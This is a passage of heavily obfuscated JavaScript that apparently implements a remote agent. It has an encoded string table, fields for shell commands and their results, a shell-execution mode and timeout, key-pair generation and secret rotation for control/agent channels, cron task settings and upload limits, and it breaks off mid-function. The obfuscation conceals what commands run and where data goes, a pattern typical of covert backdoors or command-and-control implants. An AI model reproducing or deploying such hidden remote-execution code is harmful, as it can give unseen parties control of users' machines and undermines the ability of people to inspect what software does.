        'z2v0ugvLCKnLCNrPzMLJyxrL',
        'A0TuBKO',
        'CMvXDwvZDezPBMLZAgvK',
        'D3jPDgveB21HAw5gAwXL',
        'vg9sBMe',
        'x3jLCxvLC3rLCG',
        'uNvdD0S',
        'nNWWFdH8nhWZFdj8mxW1FdC',
        'DwrAy3e',
        'z2Tlu08',
        'BxnNuMvZB2X2zxjZ',
        'sxnXANi',
        'y3jLyxrLsw50zxjMywnL',
        'wgfUBMy',
        'qxjrug8',
        'C3rHDgLJ',
        'ugvJCKO',
        'Aw52ywXPzcbiuefdsYbiDwzMBwfUihn0CMLUzW',
        'nZeWmZi4CeXwvero',
        'A2LZyw1Hx3rLCM1PBMfSx3yX',
        'Aw1Hz2uVC3zNk3HTBa',
        'Agv4',
        'CMvZAxPL',
        'qw1xtuS',
        'DhfWvKq',
        'BMv0D29YA0LUDgvYzMfJzxm',
        'z2v0uhvIBgLJsxbwna',
        '6k6/6zEUia',
        'DgfZA2TPBgWGl0yGl1qGl1bjrca',
        'tvzWDhu',
        'uLjnvhi',
        'Dg9mB3DLCKnHC2u',
        'Ahr0Chm6lY9HCgK2lMLWAwz5lM9YzW',
        'zvrTtMu',
        'x3bHCNnLtw9Kzq',
        'CwvTDMy',
        'Dhj1BMnHDgvKieHqqunligLUDgvNzxi',
        'yKDbDgG',
        'EefXqLq',
        'Ahr0Chm6',
        'Axb2nG',
        'D25dsg8',
        'sgfUzhnOywTLu3rHDgu',
        'xsdWN5QOioIUPoIVGEwKSEI0PE+8JoMDNUAZLsbuB2TLBU+8Gq',
        'z2zgywO',
        'zgf0zq',
        'CM90yxrLt3bLCMf0Aw9UywXtzwnYzxrZ',
        'tvbOsNy',
        'rwXhz1a',
        'D0LNve4',
        'CxvPy2SGDhvUBMvSihjLDhvYBMvKig5VBI1ku09oicG',
        'wwrWz2u',
        'ywrK',
        'q3PvyNq',
        'EwrvENK',
        'AgfUzhnOywTL',
        'rvD2vMi',
        'Aw5JB2DUAxrVtMf0AxzLqxbWBgLLza',
        's3vIzxjUzxrLCW',
        'DhvUBMvSignVBM5Ly3rPB24GCMvNAxn0zxjLzcbHDca',
        'DhvksxO',
        's1zhrMK',
        'z2v0t25LDgLTzvrHC2TZ',
        'rfz4CxC',
        '8j+uJcdLRQlMIlFNQ6/KUlVLIQJMLQ3LVia',
        'C2HLBgW',
        'twLZC2LUzYbJAhvUAYa',
        'ywXWBLbYB3rVy29S',
        'g1SZm21Bv0fstL0BwZbTiezjtevFuK9pvcdLGjNPGiNNM67LVzxKUi3LRzJLNkGSiow3SUI3S+I/HZOG',
        'DMvYC2LVBG',
        'y29UDgvUDc1Syw5NDwfNzq',
        'C2LNBMfS',
        'CgfYC2u',
        'z3PPCcWGzgvMBgf0zq',
        'ChjVy2vZC0HHBMrZAgfRzq',
        'vxfqy2C',
        'CgLSAwW',
        'y3vnBLG',
        'B3njBMzV',
        'AhLcEvy',
        'z2v0rMLSzvbLCM1PC3nPB25Z',
        'qLj5Chm',
        'y2f0y2G',
        'Aw1Hz2uVCg5N',
        'A2v5CY9Hz2vUDf9Ly2LLC19WDwiUyJy0',
        'qwnJzxnZlunVBNrYB2WTqwXSB3CTsgvHzgvYCW',
        'zgLZAW',
        'C2HVD1r1BM5LBa',
        'zg5ZoG',
        'DxnLza',
        'ChjVEhLszxf1zxn0',
        'CMvMCMvZAa',
        'ntaY',
        'C3rHDfn5BMm',
        'BwvYz2u',
        'ntaW',
        'shjQsKy',
        'EhrLCM0TmJu2y29SB3i',
        'CKvQAKK',
        'rw16AwW',
        'vuXuv0O',
        '8j+sPsdLKk/LIQJNU4JNQ6/LPlhOTku6ia',
        'B1fzr0i',
        'BM5eCg8',
        'tefZwgi',
        'EgHsqvm',
        'Aw5KzxHpzG',
        'Dgv4Dc9JC3m7ignOyxjZzxq9DxrMltG',
        'x2DLDenVBM5Ly3rPB25Z',
        'CgzVt1y',
        'ioMRMos6JUAuR+AmGEEjIoACRca',
        'l2fWAs9YDw4',
        'C3rYzwfTv2LUzg93CW',
        'C2L6zq',
        'zgvZDhjVEq',
        'pdGSiowUNUMzHEs9V+EuQca',
        'DKPUy3a',
        'tejywwq',
        'BhHJ',
        'zgLNzxn0',
        'Ahr0Chm6lY9TEwv4DgvYBMfSAxaUy29Tl3jHDW',
        'CuHxsKS',
        'C3rVChbLza',
        'zgf0yq',
        'CMf3sgvHzgvYCW',
        'DhvUBMvSrg9TywLU',
        'CMHhAxK',
        'uePHyLO',
        'zxf1uha',
        'zMLUywW',
        '5A+g6zkL6l+h55+TicG',
        'y3jLyxrL',
        'A3vIzwXLDa',
        'Aw5MBW',
        'uhPIBKC',
        'Bg1VvM8',
        'y29UDgvUDc1Szw5NDgG',
        'DvP2Dxi',
        'yxjJAa',
        'revcvuC',
        'BfDoCwK',
        'w0Tnt0rfxsdWN5kHios/RUATOZOG6k6+572UiokjPtGG5A2x56YM55QeieToqu1fios4LcaO5y+V6ycjksbltKfnrv9lrvKG4OMLocdLRzFNRkySios+I+wMGJOGs05btuu9BxLUyw1LieToqu1fx0Tfwt1TExnLy3jLDc1WyxnZ',
        'y29SCW',
        'C3rHCNrtDgrPBKXPC3rLBMvY',
        'qZPCv2LUzg93CW',
        'ChvZAa',
        '4P2mioE7IoERR+s8MUIVNEw8GUw4UdOG',
        'Cg93',
        'Aw1nDxO',
        'ywrKCMvZCW',
        'DhLWzq',
        'tK9ju0vFqunusu9ox1nqteLu',
        't1PRC28',
        'u0XPvMG',
        'Bg9N',
        'Cvfcy0y',
        'igvUzgvKoIa',
        'r3bkteS',
        'sw5PDgLHBgL6Aw5Nifn5C3rLBuLUzM9dB2XSzwn0B3iUlI4',
        'sevvAwy',
        'mty4',
        'oNnJAgvTzq',
        'wurdEfG',
        'ugf0AcbUB3qGzM91BMq',
        'BgHNzMW',
        'x2vTAxreyxrH',
        'q29UBMvJDgLVBJOGvxbNCMfKzq',
        'venyBxm',
        'r2nXu0O',
        're1Rr3y',
        'C2vUzeHHBMrZAgfRzq',
        'C3rKzxjY',
        'Bwv0Ag9K',
        'CNf6Dxa',
        'ywnJzxnZx2rLBMLLza',
        'zhf5B2y',
        'Ag9ZDa',
        'Ec10B3rHBc1JAhvUA3m',
        'zw5K',
        'zhLos1O',
        'mta0odu3nJaW',
        'C3vytvG',
        'zfHSAuO',
        'CM1KAxjtEw5J',
        'ChvTCe9YAwDPBG',
        'yLLVy0G',
        'yu9Jqxq',
        'v3nUwgi',
        'DKP4wNO',
        'C0TnvxG',
        'r2v0uMvTB3rLuhvIBgLJs2v5',
        'q1jTs1G',
        'u3rHCNrPBMCGsfruucbZzxj2zxiUlI4',
        'DwrW',
        'B3DNq2i',
        'svriB0O',
        'x2nOzwnRqwnJzxnZ',
        'vevnueTfwv9nqvHFvfrmx0Hpvvjt',
        'DLnXrfC',
        'CxfwqLu',
        'C2vUza',
        'CMvZDg9YzuzYB21tDg9Yzq',
        'Ew5Tr1C',
        'z2v0sg91CNm',
        'BgLZDa',
        'ywnJB3vUDf90ywC',
        'qKjHALC',
        'nuj3y2njtq',
        'x25VDgLMEvDPBMrVD3m',
        'BunLr2e',
        'mc41lJGTANm',
        'tMPArMi',
        'BgfZDe5LDhDVCMTuAw1L',
        'vgfYz2v0igLZigeGzgLYzwn0B3j5oIa',
        'CMvSyxrPDMu',
        'ihbYB3H5igzHAwXLzdOG',
        'mZm4ntz5BhLWwhe',
        'zw5JCNLWDa',
        'BwvZC2fNzq',
        'v0jQuLe',
        't3jPz2LUoIbODhrWCZOVlW',
        'q2XtwNG',
        'CMfqDue',
        'q0n5s1K',
        'zgLZA190B3rHBa',
        't2nYsgy',
        'AgvHzgvYC1nLBNq',
        'tunlswm',
        'DwDbuee',
        'sMTnrwy',
        'tK1tzge',
        'wwXvAfm',
        'u1z0tK0',
        'B25fEgL0',
        'y3b1',
        'x2LZrxHWAxjLza',
        'v2PPvxi',
        'y2z0Dw5UzwWUy29T',
        'CMvHzgvY',
        'D2DKwwS',
        'CwrIuxC',
        'y29UDgvUDc10ExbL',
        'y29UBMvJDgLVBLDPBMrVDW',
        'r0DTre0',
        'uLzNu3y',
        'ywjZ',
        'tK9ju0vFs0vzu19jtLrfuK5bta',
        'CLvMthi',
        'w1DbuK5Die5VAxnLifDbu00GBw9KDwXLigzHAwXLzcb0BYbSB2fKoG',
        's0H1qMG',
        'l2jPBI96C2G',
        'ls0TlwTPC2fTyq',
        'Aw5JB2DUAxrVuMvXDwvZDgvK',
        'x2DLBMvYyxrL',
        'Aw50zxjUywW',
        'mc4WlJaUma',
        'w1rHC2TtDg9Yzv0G4P2miowUMUAxTUs7U+wkOEAbOUwKJEw8GUw4UcaO5lIn5B2X5zon5PYn5yQHktOG',
        'D2fZBsbZDhjLyw1PBMCGy29TCgLSzsbMywLSzwq',
        'zwHftum',
        'tgLiv3e',
        'twjoAMS',
        'CgvYBwLZC2LVBNm',
        'zvzbueW',
        'zMvLza',
        'AgHuEMm',
        'sNHut2q',
        'vKvsu0LptG',
        'v21QBfu',
        'Ec1MAwXLlw5HBwu',
        'B0DmBKy',
        's3Dnu0C',
        'AxnjBML0Awf0B3i',
        'CMvHzeHLywrLCNm',
        'AffTtLK',
        'l3bYB2mVy3b1Aw5MBW',
        'Ahr0Chm6lY9JAgvJA2LWlMfTyxPVBMf3CY5JB20',
        'wf9psW',
        'zwD1t20',
        '8j+sOsdKV67LPi3LU7RORQ46ioIVT+wCQoMHUEEBRUEBRUw9LEs4I+I/KoIHJcbUCg0GAw5ZDgfSBcbaBhLKzwXSl25VzguTChr5',
        'sgjPsfm',
        'C2v0vtG',
        'Ag9ZDg5HBwu',
        'lcbltKfnrv9lrvK9',
        'EhfTz2K',
        'y21K',
        'ChjPDMf0zq',
        'sg9ZDdOG',
        'Dgv4Da',
        'zgvSzxrLrMLSzxm',
        'tfjKyuO',
        'uNrPBwvVDxq',
        'vfbODxq',
        'DMjirLq',
        'q09ovfjptf9qvujmsunFs0vz',
        'Dw1QyKC',
        'l2fWAs9HCMDV',
        'wvbPEvm',
        'uxHPEeG',
        'DgTlrKS',
        'zwnKC2fqDwjRzxK',
        't1PjEw0',
        'CvHiyvG',
        'u1PxC1K',
        'v2fTs3a',
        'y3DK',
        'Dw5RBM93BG',
        'uffVrfG',
        'l2fWAs9MAwXLl25LDW',
        'uefbtwS',
        'CgHHC2u',
        'BM9PC2uTyY53yxnT',
        'yKHSC0q',
        'DgHLBG',
        'l3r1BM5LBa',
        'rgfiq2i',
        'Dvf3r3K',
        'z2v0uhvIBgLJsxbwnG',
        'y3jLyxrLsgfZAa',
        'x1niwKfmx05btuvFq0HbuLm',
        'rwvnwMy',
        'sevbra',
        'x2fWCgvUzeXVzW',
        'xsdMIAFOOyZNU4JNQ6/OTytMUPdMUixNKiyUlI4',
        'C2H6lMfSihjLCxvLC3qGDgLTzw91Da',
        'oM1LDgHVza',
        'D3jPDgfIBgu',
        'Ahr0CdO',
        'y2H1BMTFAwqGyw5KihrVDgfSx2nODw5RCYbTDxn0igjLig51BwvYAwm',
        '8j+uHcbBq2fJAgvDiejHC2vjBMzVioE8K+wTMow3SUI/H+ACN++8Jow3SUMhJEAwSoIWG+w6PUEZU+E7N+I1HoA6KoI/M+IHJoABToAwSooaGG',
        'wMTirhi',
        'BM8GDhvUBMvSigzVDw5Kig9UihbVCNqG',
        'zNvSBa',
        'zNvxsNa',
        'uKnAswq',
        'Ahr0Chm',
        'wNnbvMq',
        'sgPlCwm',
        'zM5dEMK',
        'zwnKC2fFChjPDMf0zv9RzxK',
        'Aw52ywXPzcbXDwLJAYb0Dw5UzwWGCMvZCg9UC2u6ia',
        'vw5Oyw5KBgvKifbYB21PC2uGuMvQzwn0Aw9UoG',
        'zM9YBwf0',
        'x3DHAxrxAw5KB3C',
        's05btuuG6l+h55+TicG',
        'DLj5C3C',
        'qwnJzxnZlunVBNrYB2WTqwXSB3CTt3jPz2LU',
        'l3j1BI8Uy29UDgfPBMvYzw52',
        'zhvWBgLJyxrL',
        'C3rHDhvZq29Kzq',
        'EvD4CKS',
        'wufZyui',
        'ywDL',
        'EuXfCLK',
        'x2rVtM9PC2viyw5KC2HHA2u',
        'yufTt0G',
        'C2vYAwfSAxPLzf9OzwfKzxjZ',
        'zMfJBwi',
        'Aw5MBgf0zq',
        'zNftse0',
        's05btuvFs0vz',
        'x3jLCMvNAxn0zxi',
        'x29UrxHPDenI',
        'we1mzhy',
        'nNW3FdeWFdL8mNW4Fdn8mtf8mxWXm3WXmNW1Fde0Fde1Fdr8ma',
        'qwDLBNq',
        'A3vIzxbVzhm',
        'EM5HuKG',
        'yxjNBYb0Dw5UzwWGBg9VCcbMB3iG',
        'Dhj1zq',
        'q3fbA2C',
        'rM9jBgy',
        'zNjLzq',
        'Ee9Uwuy',
        'yNvMzMvY',
        'DhjHBNnMzxiTzw5JB2rPBMC',
        'x3n0yxr1C19JywnOzv90Aw1L',
        'D3jPDgvcExrLCW',
        'zuzHwgO',
        'Dw1vDhK',
        'qNDIuum',
        'C2HVCNq',
        '4P2miowqR+wkQoEgLoAwRtOGruneu0eG5ywS6zkL57Y65AsX5OIw6kEJ5P6q5AsX6lsL77Ym6z2EierfqLvhioAOOEw8J+s4I+AlKUE7NEwqR+wkQa',
        'EKrJq1q',
        'vefts19usu1ft1vu',
        's2XuDwS',
        'wKLqx01bwf9msvnururFrKLmrvm',
        'CuHYtMO',
        'CgLWzq',
        'AxnjBNrLz2vY',
        'u3LozLe',
        'Aw1Hz2uVz2LM',
        'icaGms4G6k6+572U546V5Akd5y+y6yEpoIbLEhbVCNqGruneu0fFufvcs0vzpsCTls0Tlujfr0LoifbvqKXjqYblrvKTls0TlsCUlI4N',
        'ug9PBNq',
        'swLzBNC',
        'BwfPBG',
        'C3rHCNrtzxnZAw9U',
        'r0rZDw0',
        'BgzfCxG',
        'C3bRAq',
        'CMvHBhbHDgHtEw5J',
        'zxHLy3v0zu9UzxrPBwvuyxnRCW',
        'wLf6C3m',
        'Dw56AxbbCMnOAxzL',
        'x3j1BLrLCM1PBMfS',
        'y01JDw4',
        'zNjVBq',
        'C3vIAMvJDa',
        'rKHeqxK',
        'y29UC3rHBNrZ',
        'ic0+ideYnY4WlJaUmtO',
        'AxrLBxmGCMvXDwLYzwqGkg5VBI1LBxb0EsbHCNjHEsK',
        'mJDAyM9fC00',
        'AxneAxi',
        'nda0',
        'rwDswMS',
        'EuPWC2e',
        'x2DLDerPC2TjBMzV',
        'Ag9TzurPCG',
        'Ec1MAwXLlxnPEMu',
        'x25LEhq',
        'rg9XyLO',
        'q0vmvMu',
        'teTQsxi',
        'x3n0yxr1C19JywnOzq',
        'BM9Uzq',
        'B3jPz2LUignSB3nLzcbIzwzVCMuGCMvZCg9UC2uGAgvHzgvYCW',
        'BxnNuxvLDwu',
        'D3jPDgvgAwXLu3LUyW',
        'runjrvnFufvcs0vzoIdMNkRORR7NVA7NJQ/LOOpLJ5JPH4/KUjtMLOFKU7yGA2v5CY9Hz2vUDf9Ly2LLC19WDwiUyJy0ios4JEwTMowCQa',
        'shrmBeG',
        'r0fit0u',
        'ExbmA0C',
        'EMDHrNm',
        'Ec1HDxrOlxrVA2vU',
        'y2yTy2XVDwrMBgfYzwqTCMvZCg9UC2uTAgvHzgvYCW',
        'tM9PC2vFwfHFmJu1mtLFq2HHq2HHug9SEv9cteflrtjZ',
        'u3ryD1y',
        'B01ly3e',
        'u3f3Aeu',
        'rg5Ptvy',
        'C2vJlxDLyNnVy2TLDc1Hy2nLChq',
        'lMvUDG',
        'wLHhEgy',
        'u2vJlvDLyLnVy2TLDc1wzxjZAw9UoIaXmW',
        'zwnKC2fFDMS',
        't0vLDLG',
        'BM9Uy2u',
        '6k+35Rgc6lAf5PE2',
        'zxHWB3j0',
        'BgLTAxq',
        'u2vYDMvYigXPC3rLBMLUzYbZDwnJzxnZzNvSBhK',
        'qKLTtfO',
        'txzTsfm',
        'l2fWAs90yxnRl2XVzY9ZDw1Tyxj5',
        'q2XLyw5SEsbJBg9Zzwq',
        't3Pmq3C',
        'Axnoyu4',
        'zxHLy3v0zq',
        'tLjYwLa',
        'yNr5z1K',
        'quDftLrFufjjvKfurv9lrvK',
        'vgvTCeTLEu1HBMfNzxiGAw5PDgLHBgL6zwq',
        'sw5PDgLHBgL6zq',
        'ywvZlti1nI1Ny20',
        'zM9UDc93B2zMmG',
        'y0r5A3G',
        'vhLszLi',
        'y2DZA0W',
        'vMzQqvy',
        't2zWz2G',
        'vKzQDMu',
        'BfjMv20',
        'ywnJB3vUDfrHzW',
        'weHwEvi',
        'BwvTx3rVDgfS',
        'C3bSAwnL',
        'BwLU',
        'ugL0t0C',
        'CMvNAw9Ums52mI5HCMDVDhvUBMvSlMnVBq',
        'DMvYAwz5u2LNBMf0DxjL',
        'D2XQt1u',
        'qvzdug0',
        'wfrszMq',
        'C3rYAwn0lxrYyw5ZCg9YDc1Zzwn1CML0Eq',
        'yKv4vvO',
        'u2v0DgLUzYb1CcbxzwjtB2nRzxqGDgvYBwLUywWGCM91DguUlI4',
        'wNrNueS',
        'rxHWCMvZCYbHChaGy3jLyxrLzcbHBMqGzxHWCMvZC1DZigfWCgXPzwq',
        'EMLWsxrLBxm',
        'zgLAD1O',
        'C2n6wuW',
        'Dhj1BMnHDgvKieHqqunlihn0CMLUzYbKyxrH',
        'C2TPChbLza',
        'q3jLyxrPBMCGrxHWCMvZCYbHChaUlI4',
        'qMruqM0',
        'y2LIu0e',
        'w1rHC2TtDg9Yzv0G4P2miowTMowcQoEjIoACRca',
        's01preu',
        'AxnwywXPzeLqDJy',
        'C2vUzenPCgHLCG'
    ];
    a0a = function () {
        return gA;
    };
    return a0a();
}
class a0K extends a0G {
    constructor() {
        const bd = a0aY, a = { 'zAwCM': '4|3|1|2|0' }, b = a[bd(0x3c0)][bd(0x493)]('|');
        let c = 0x0;
        while (!![]) {
            switch (b[c++]) {
            case '0':
                this['cmd'] = '';
                continue;
            case '1':
                this[bd(0x2a0)] = 0x0;
                continue;
            case '2':
                this[bd(0x3e9)] = ![];
                continue;
            case '3':
                this['result'] = '';
                continue;
            case '4':
                super();
                continue;
            }
            break;
        }
    }
}
class a0L {
    constructor() {
        const be = a0aY;
        this[be(0x467)] = '', this[be(0x7d7)] = '', this[be(0x565)] = '', this[be(0x540)] = 0x0, this[be(0x1f7)] = '', this[be(0x1ac)] = '', this[be(0x30a)] = '', this['owner'] = '';
    }
}
class a0M {
    constructor() {
        const bf = a0aY, a = { 'sHvkV': bf(0x6f6) }, b = a[bf(0x3ee)][bf(0x493)]('|');
        let c = 0x0;
        while (!![]) {
            switch (b[c++]) {
            case '0':
                this[bf(0x565)] = '';
                continue;
            case '1':
                this[bf(0x614)] = ![];
                continue;
            case '2':
                this[bf(0x467)] = '';
                continue;
            case '3':
                this[bf(0x7d7)] = '';
                continue;
            case '4':
                this['mode'] = '';
                continue;
            case '5':
                this[bf(0x794)] = ![];
                continue;
            case '6':
                this[bf(0x9b)] = ![];
                continue;
            case '7':
                this[bf(0x30a)] = '';
                continue;
            }
            break;
        }
    }
}
class a0N extends a0G {
    constructor() {
        const bg = a0aY;
        super(), this[bg(0x83e)] = [];
    }
}
class a0O {
    static [a0aY(0x40f)]() {
        const bh = a0aY, a = {
                'iYrbX': bh(0x289),
                'BBajW': function (i, j) {
                    return i !== j;
                },
                'nyfKW': 'base64'
            }, {
                privateKey: b,
                publicKey: c
            } = a0k['generateKeyPairSync'](a[bh(0x808)]), d = b[bh(0x68f)]({ 'format': bh(0x279) }), f = c[bh(0x68f)]({ 'format': bh(0x279) }), g = Buffer[bh(0x664)](d['d'], bh(0x420)), h = Buffer[bh(0x664)](f['x'], 'base64url');
        return (a[bh(0x59d)](g[bh(0x7bc)], 0x20) || a['BBajW'](h[bh(0x7bc)], 0x20)) && a0D['error'](bh(0x21a)), {
            'private_b64': g['toString'](a[bh(0x120)]),
            'public_b64': h[bh(0xec)](a[bh(0x120)])
        };
    }
    static [a0aY(0x12c)](a) {
        const bi = a0aY, b = this[bi(0x40f)]();
        return {
            'role': a,
            'private_b64': b[bi(0x1c7)],
            'public_b64': b[bi(0x45e)]
        };
    }
    static [a0aY(0x7ca)](a = a0aY(0x235), b = a0aY(0x63b)) {
        const bj = a0aY, c = {
                'control': this[bj(0x12c)](a),
                'agent': this['generateSingle'](b)
            };
        return c;
    }
}
class a0P {
    static [a0aY(0x5f1)] = parseInt(process.env.EXEC_TIMEOUT || '30');
    static ['EXEC_SHELL_MODE'] = (process.env.EXEC_SHELL || a0aY(0x63f))[a0aY(0x4ee)]() === a0aY(0x63f);
    static [a0aY(0x55a)] = (process.env.DEBUG || a0aY(0x2ea))['toLowerCase']() === a0aY(0x63f);
    static [a0aY(0x316)] = parseInt(process.env.TIMESTAMP_WINDOW || '3600');
    static [a0aY(0xbe)] = parseInt(process.env.LOG_LEVEL || (this[a0aY(0x55a)] ? '0' : '3'), 0xa);
    static ['ECDSA_PUBLIC_KEY_PEM'] = a0P[a0aY(0x16e)](a0aY(0x6f8), a0aY(0x454)) || 'ECDSA公钥内容';
    static ['ECIES_PUBLIC_KEY_PEM'] = a0P[a0aY(0x16e)](a0aY(0x387), a0aY(0x523)) || 'ECIES公钥内容';
    static [a0aY(0x3b2)] = parseInt(process.env.TEMPKEY_TTL || '24', 0xa);
    static [a0aY(0x594)] = parseInt(process.env.TEMPKEY_MAX_TTL || a0aY(0x56f), 0xa);
    static [a0aY(0x394)] = a0F();
    static [a0aY(0x106)] = parseInt(process.env.MAX_UPLOAD_SIZE || a0aY(0x583));
    static [a0aY(0x23f)] = (process.env.FOLLOW_SYMLINKS || a0aY(0x2ea))[a0aY(0x4ee)]() === a0aY(0x63f);
    static [a0aY(0x1cb)] = (process.env.FILE_AUDIT_LOG || a0aY(0x63f))['toLowerCase']() === 'true';
    static [a0aY(0x2c7)] = !![];
    static [a0aY(0x363)] = [];
    static [a0aY(0x4be)] = {};
    static [a0aY(0x3a5)] = ![];
    static [a0aY(0x64e)] = parseInt(process.env.TASK_TIMEOUT || '300');
    static ['CRON_CHECK_INTERVAL'] = parseInt(process.env.CRON_INTERVAL || '30');
    static [a0aY(0x414)] = [];
    static [a0aY(0x36a)] = [];
    static [a0aY(0x19c)] = parseInt(process.env.MAX_TASK_LOG || a0aY(0x780));
    static ['HOST'] = process.env.HOST || a0aY(0x5ce);
    static ['PORT'] = parseInt(process.env.KPORT || process.env.PORT || process.env.SERVER_PORT || a0aY(0x419));
    static [a0aY(0x6c0)] = (process.env.KMODE || '0')['trim']() || '0';
    static [a0aY(0x41a)] = (process.env.KNAME || '')['trim']();
    static [a0aY(0x636)] = (process.env.KNAME_KEY || '')['trim']();
    static [a0aY(0x234)] = process.env.KPATH || '';
    static [a0aY(0xbd)] = process.env.AGENT_VERSION || a0aY(0x5a1);
    static [a0aY(0x3bb)] = a0k['randomBytes'](0x20)[a0aY(0xec)](a0aY(0x2df));
    static ['NOISE_KEYS_INTERNAL'] = a0O['generatePair']();
    static [a0aY(0x73d)]() {
        const bk = a0aY, a = {
                'EvcHN': bk(0x3fe),
                'uXtcc': bk(0x2df),
                'XHVyR': bk(0x7c1)
            };
        return a0k[bk(0x1a2)](a[bk(0x378)], Buffer[bk(0x664)](this[bk(0x3bb)], a['uXtcc']))[bk(0x199)](a[bk(0x6a8)])['digest'](bk(0x2df));
    }
    static ['rotateOperationalSecrets']() {
        const bl = a0aY, a = {
                'bimPR': bl(0x2df),
                'NXDzA': bl(0xc9)
            }, b = a0O[bl(0x7ca)]();
        this[bl(0x5c5)][bl(0x43e)] = b[bl(0x43e)], this[bl(0x42b)][bl(0x44a)][bl(0x5ec)] = b['control'][bl(0x1c7)], this[bl(0x3bb)] = a0k[bl(0x1ee)](0x20)[bl(0xec)](a[bl(0x6fc)]), this['_baseinfo_cache'] = null, this[bl(0xf7)] = 0x0, this[bl(0x676)] = null, this[bl(0x646)] = 0x0, a0D[bl(0x10d)](a['NXDzA']);
    }
    static [a0aY(0x42b)] = {
        'controller': { 'private': this['NOISE_KEYS_INTERNAL'][a0aY(0x43e)]['private_b64'] },
        'agent': { 'public': this[a0aY(0x5c5)]['agent'][a0aY(0x45e)] }
    };
    static ['BASEINFO_CACHE_TTL'] = 0xe10;
    static [a0aY(0x2bf)] = 0x1e;
    static ['_baseinfo_cache'] = null;
    static [a0aY(0xf7)] = 0x0;
    static [a0aY(0x3c3)] = null;
    static [a0aY(0x676)] = null;
    static [a0aY(0x646)] = 0x0;
    static ['_status_fetch_promise'] = null;
    static ['_getConfigValue'](a, b) {
        const bm = a0aY, c = { 'fEmqV': bm(0x31e) }, d = process.env[a];
        if (d)
            return d;
        const f = a0o[bm(0x16d)](__dirname, b);
        if (a0l[bm(0x291)](f))
            try {
                return a0l[bm(0x23e)](f, c[bm(0x2fb)])['trim']();
            } catch (g) {
            }
        return '';
    }
    static [a0aY(0x7a1)]() {
        const bn = a0aY, a = {
                'nBQVe': bn(0x67b),
                'TCXms': function (b, c) {
                    return b > c;
                },
                'ZpVHe': bn(0x370),
                'XeuFL': '\x0a💡\x20解决方法:'
            };
        if (!this[bn(0x55a)]) {
            const b = [];
            !this[bn(0x439)] && b[bn(0x560)](bn(0x837));
            !this['ECIES_PUBLIC_KEY_PEM'] && b['push'](a['nBQVe']);
            if (a[bn(0x576)](b[bn(0x7bc)], 0x0)) {
                const c = a[bn(0x7bd)][bn(0x493)]('|');
                let d = 0x0;
                while (!![]) {
                    switch (c[d++]) {
                    case '0':
                        a0D['debug'](bn(0x356));
                        continue;
                    case '1':
                        a0D['error'](bn(0x41b));
                        continue;
                    case '2':
                        process[bn(0x205)](0x1);
                        continue;
                    case '3':
                        b[bn(0x148)](f => a0D['error'](bn(0x207) + f));
                        continue;
                    case '4':
                        a0D[bn(0x4a6)](bn(0x656));
                        continue;
                    case '5':
                        a0D[bn(0x4a6)](a[bn(0x3bf)]);
                        continue;
                    }
                    break;
                }
            }
        }
    }
    static [a0aY(0x52d)](a = {}) {
        const bo = a0aY, b = {
                'dboWR': function (c, d, f) {
                    return c(d, f);
                },
                'kxxsn': function (c, d) {
                    return c(d);
                }
            };
        if (!a)
            return;
        a[bo(0xe9)] !== undefined && a[bo(0xe9)] !== null && (this[bo(0xe9)] = b[bo(0x12d)](parseInt, b[bo(0x11e)](String, a[bo(0xe9)]), 0xa)), a['ECDSA_PUBLIC_KEY_PEM'] && (this['ECDSA_PUBLIC_KEY_PEM'] = a['ECDSA_PUBLIC_KEY_PEM'][bo(0x450)]()), a[bo(0x48c)] && (this[bo(0x48c)] = a[bo(0x48c)][bo(0x450)]());
    }
}
class a0Q {
    constructor() {
        const bp = a0aY;
        this['_key'] = null, this[bp(0x351)] = null;
    }
    [a0aY(0x251)](a) {
        const bq = a0aY, b = { 'mWJXZ': bq(0x3de) }, c = b[bq(0x1d9)][bq(0x493)]('|');
        let d = 0x0;
        while (!![]) {
            switch (c[d++]) {
            case '0':
                if (this[bq(0x4c7)])
                    return this[bq(0x4c7)];
                continue;
            case '1':
                return this[bq(0x4c7)];
            case '2':
                this[bq(0x4c7)] = this[bq(0x5cc)](a);
                continue;
            case '3':
                a0D[bq(0x554)](bq(0x731) + this[bq(0x4c7)]['key_id'] + bq(0x26b) + a + '\x20小时');
                continue;
            case '4':
                this[bq(0x3fd)]();
                continue;
            }
            break;
        }
    }
    [a0aY(0x151)]() {
        const br = a0aY;
        this['_expireCurrent']();
        if (this[br(0x4c7)])
            return this[br(0x4c7)][br(0x68b)];
        return null;
    }
    [a0aY(0x3f4)]() {
        const bs = a0aY;
        this[bs(0x3fd)]();
        if (this[bs(0x4c7)])
            return this['_key'][bs(0x3b3)];
        return null;
    }
    [a0aY(0x3fd)]() {
        const bt = a0aY, a = {
                'qHrNj': function (b, c) {
                    return b === c;
                },
                'aKQqg': bt(0xca)
            };
        if (this[bt(0x4c7)] && this[bt(0x5ba)](this[bt(0x4c7)])) {
            const b = this[bt(0x4c7)][bt(0x6e9)];
            this[bt(0x4c7)] = null, a0D['warn'](bt(0x488) + b);
            if (a[bt(0x651)](typeof this['onExpired'], a[bt(0x2de)]))
                try {
                    this['onExpired']();
                } catch (c) {
                    a0D[bt(0x1c6)]('[TempKey]\x20过期轮换失败:\x20' + c[bt(0x5a9)]);
                }
        }
    }
    [a0aY(0x5ba)](a) {
        const bu = a0aY, b = {
                'kfhTo': function (c, d) {
                    return c >= d;
                }
            };
        return b[bu(0x79e)](Math[bu(0x15d)](Date['now']() / 0x3e8), a[bu(0x4cb)]);
    }
    ['_generate'](a) {
        const bv = a0aY, b = {
                'XNJex': bv(0x36e),
                'qrRVk': 'pkcs8',
                'wIgTN': bv(0x6ee),
                'lFDzm': bv(0x65d),
                'FLqKn': bv(0x279),
                'quZMv': bv(0x386),
                'WtbFh': function (o, p) {
                    return o - p;
                },
                'GCrmD': function (o, p) {
                    return o * p;
                },
                'dATyZ': function (o, p) {
                    return o + p;
                },
                'zwQyy': bv(0x4e4),
                'Buwav': bv(0x2df)
            }, {
                privateKey: c,
                publicKey: d
            } = a0k['generateKeyPairSync']('ec', { 'namedCurve': b[bv(0x311)] }), f = c[bv(0x68f)]({
                'type': b['qrRVk'],
                'format': b[bv(0x500)]
            }), g = d['export']({
                'type': b[bv(0x3b0)],
                'format': bv(0x6ee)
            }), h = a0k[bv(0x1ee)](0x20), i = Buffer[bv(0x664)](a0B[bv(0xd1)](h, ![])), j = c[bv(0x68f)]({ 'format': b['FLqKn'] }), k = d[bv(0x68f)]({
                'type': bv(0x65d),
                'format': b[bv(0x259)]
